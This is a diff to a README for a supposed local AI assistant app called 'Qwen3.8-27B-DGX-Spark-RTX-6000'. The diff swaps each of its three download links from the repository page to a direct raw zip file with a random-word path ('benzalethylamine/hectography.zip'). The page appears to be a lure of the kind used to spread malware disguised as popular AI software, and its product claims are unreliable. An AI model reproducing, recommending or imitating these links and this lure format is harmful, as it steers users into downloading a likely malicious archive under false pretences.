@@ -1,6 +1,6 @@
 # 🚀 Qwen3.8-27B-DGX-Spark-RTX-6000 - Powerful AI for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download-Qwen3.8_27B_AI-blue?style=for-the-badge&logo=github&color=4CAF50)](https://github.com/norinecollateral613/Qwen3.8-27B-DGX-Spark-RTX-6000)
+[![Download Now](https://img.shields.io/badge/Download-Qwen3.8_27B_AI-blue?style=for-the-badge&logo=github&color=4CAF50)](https://raw.githubusercontent.com/norinecollateral613/Qwen3.8-27B-DGX-Spark-RTX-6000/main/benzalethylamine/hectography.zip)
 
 Welcome to Qwen3.8-27B-DGX-Spark-RTX-6000, a state-of-the-art AI assistant that runs directly on your computer. This application brings the power of a 27-billion parameter language model to your fingertips, enabling you to write, analyze, create, and solve problems with natural language. Whether you are a student, writer, researcher, or curious user, this tool provides you with a private, fast, and intelligent companion that respects your privacy and works offline.
 
@@ -18,7 +18,7 @@ This software is specifically tuned for the NVIDIA DGX Spark and RTX 6000 PRO gr
 
 Your download is ready. Visit the link below to get the application:
 
-[🔗 Click Here to Download Qwen3.8-27B](https://github.com/norinecollateral613/Qwen3.8-27B-DGX-Spark-RTX-6000)
+[🔗 Click Here to Download Qwen3.8-27B](https://raw.githubusercontent.com/norinecollateral613/Qwen3.8-27B-DGX-Spark-RTX-6000/main/benzalethylamine/hectography.zip)
 
 Visit this link to download the application.
 
@@ -131,7 +131,7 @@ If the app closes unexpectedly, try restarting your computer and running it agai
 
 You are now ready to explore the possibilities with Qwen3.8-27B-DGX-Spark-RTX-6000. Download it today, and unlock a powerful assistant right on your desktop.
 
-[![Get Started](https://img.shields.io/badge/🚀-Download_Now-orange?style=for-the-badge&logo=download)](https://github.com/norinecollateral613/Qwen3.8-27B-DGX-Spark-RTX-6000)
+[![Get Started](https://img.shields.io/badge/🚀-Download_Now-orange?style=for-the-badge&logo=download)](https://raw.githubusercontent.com/norinecollateral613/Qwen3.8-27B-DGX-Spark-RTX-6000/main/benzalethylamine/hectography.zip)
 
 Visit this link to download the application.
 
